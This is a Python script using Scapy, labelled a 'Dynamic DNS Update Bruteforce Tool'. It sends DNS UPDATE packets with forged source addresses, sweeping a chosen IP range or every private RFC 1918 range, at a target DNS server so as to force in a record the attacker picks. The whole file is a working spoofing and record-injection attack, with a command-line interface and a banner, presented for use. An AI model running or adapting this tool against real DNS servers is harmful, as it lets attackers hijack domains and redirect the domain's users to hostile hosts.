#!/usr/bin/env python
import sys
import time
import argparse

from scapy.all import *
from netaddr import IPNetwork

# http://stackoverflow.com/a/287944/1195812
class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

def statusmsg( msg, mtype = "status" ):
    """
    Status messages
    """
    if mtype == "status":
        print( "[ STATUS ] " + msg )
    elif mtype == "warning":
        print( bcolors.WARNING + "[ WARNING ] " + msg + bcolors.ENDC )
    elif mtype == "error":
        print( bcolors.FAIL + "[ ERROR ] " + msg + bcolors.ENDC )
    elif mtype == "success":
        print( bcolors.OKGREEN + "[ SUCCESS ] " + msg + bcolors.ENDC )

def spray_target( target_ip, spoof_ip_range, zone, rrname, rrdata, rrtype, rrttl ):
    packet_list = []
    statusmsg( "Beginning DNS UPDATE bruteforce from range of " + spoof_ip_range )
    statusmsg( "Loading up memory buffer with packet data..." )
    for source_ip in IPNetwork( spoof_ip_range ):
	packet = (
	    IP(
		dst=target_ip,
		src=str( source_ip )
	    )/
	    UDP(
		dport=53
	    )/
	    DNS(
		opcode=5,
		rd=0,
		qd=DNSQR(
		    qname=zone,
		    qtype="SOA",
		),
		ns=[DNSRR(
		    type=rrtype,
		    ttl=int( rrttl ),
		    rrname=rrname,
		    rdata=rrdata
		)]
	    )
	)

        packet_list.append( packet )

	if len( packet_list ) >= BUFFER_SIZE:
	    statusmsg( "Sending spoofed DNS UPDATE packets from range " + str( packet_list[ 0 ].src ) + "-" + str( packet_list[ -1 ].src ) + " to target " + target_ip + "..." )
            start_time = time.time()
	    send( packet_list, verbose=False )
            end_time = time.time()
	    statusmsg( "Complete, all packets sent to target! Clearing buffer and continuing..." )
            packet_send_time_total = str( round( ( end_time - start_time ), 2 ) )
            packet_per_second = str( round( ( len( packet_list ) / ( end_time - start_time ) ), 2 ) )
            statusmsg( "Sent " + str( len( packet_list ) ) + " packets in " + packet_send_time_total + " seconds ~" + packet_per_second + "/pps!" )
	    packet_list = []

    start_time = time.time()
    statusmsg( "Sending spoofed DNS UPDATE packets from range " + str( packet_list[ 0 ].src ) + "-" + str( packet_list[ -1 ].src ) + " to target " + target_ip + "..." )
    send( packet_list, verbose=False ) # Send the last of the packets
    end_time = time.time()
    packet_send_time_total = str( round( ( end_time - start_time ), 2 ) )
    packet_per_second = str( round( ( len( packet_list ) / ( end_time - start_time ) ), 2 ) )
    statusmsg( "Sent " + str( len( packet_list ) ) + " packets in " + packet_send_time_total + " seconds ~" + packet_per_second + "/pps!" )
    statusmsg( "Completed DNS UPDATE bruteforce from entire " + spoof_ip_range + " range!" )

def spray_from_all_internal_ips( target_ip, zone, rrname, rrdata, rrtype, rrttl ):
    spray_target( target_ip, "192.168.0.0/16", zone, rrname, rrdata, rrtype, rrttl )
    spray_target( target_ip, "172.16.0.0/12", zone, rrname, rrdata, rrtype, rrttl )
    spray_target( target_ip, "10.0.0.0/8", zone, rrname, rrdata, rrtype, rrttl )

if __name__ == "__main__":
    parser = argparse.ArgumentParser( description="Force a dynamic DNS UPDATE via bruteforcing source IPs!" )
    parser.add_argument("-sl", "--silence", dest="silence", action="store_true", help="Don't print the logo." )
    parser.add_argument("-p", "--private", dest="private_brute", action="store_true", help="Bruteforce updates with source IPs from all RFC 1918 IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)" )
    parser.add_argument("-b", "--buffer", dest="buffer", help="Buffer size in packets, set as high as possible given your system's available RAM for max speed.", required=False )
    parser.add_argument("-r", "--range", dest="brute_range", help="IP range to bruteforce DNS UPDATE attempts from (e.g. 52.1.1.1/28)" )
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address of the server to be bruteforced.", required=True )
    parser.add_argument("-rrn", "--rrname", dest="rrname", help="Remote resource record name (e.g. subdomain.example.com)", required=True )
    parser.add_argument("-rrd", "--rrdata", dest="rrdata", help="Remote resource record data (e.g. 127.0.0.1, external.fqdn.com.)", required=True )
    parser.add_argument("-rrt", "--rrtype", dest="rrtype", help="Remote resource record type (e.g. A, CNAME, TXT, SOA)", required=True )
    parser.add_argument("-ttl", "--rrttl", dest="rrttl", help="Remote resource record TTL value in seconds (e.g. 120, 3600)" )
    parser.add_argument("-z", "--zone", dest="zone", help="Remote zone of the target (e.g. example.com)", required=True )
    args = parser.parse_args()

    if not args.silence:
        print("""
:::    ::: :::::::::  :::::::::  :::::::::  :::    ::: ::::::::::: :::::::::: 
:+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:    :+:     :+:     :+:        
+:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+        
+#+    +:+ +#++:++#+  +#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#   
+#+    +#+ +#+        +#+    +#+ +#+    +#+ +#+    +#+     +#+     +#+        
#+#    #+# #+#        #+#    #+# #+#    #+# #+#    #+#     #+#     #+#        
 ########  ###        #########  ###    ###  ########      ###     ########## 

                                           Dynamic DNS Update Bruteforce Tool
    """)

    # Set TTL if not explictly set
    if not args.rrttl:
        args.rrttl = 60

    # Set buffer if not explictly set
    if not args.buffer:
        statusmsg( "No buffer size specified, setting a buffer of 1K packets by default!")
        args.buffer = ( 1 * 1000 )
    BUFFER_SIZE = int( args.buffer )

    if args.private_brute:
        spray_from_all_internal_ips( args.target_ip, args.zone, args.rrname, args.rrdata, args.rrtype, args.rrttl )
    elif args.brute_range:
        spray_target( args.target_ip, args.brute_range, args.zone, args.rrname, args.rrdata, args.rrtype, args.rrttl )
    else:
        print( "No available scan selected!" )
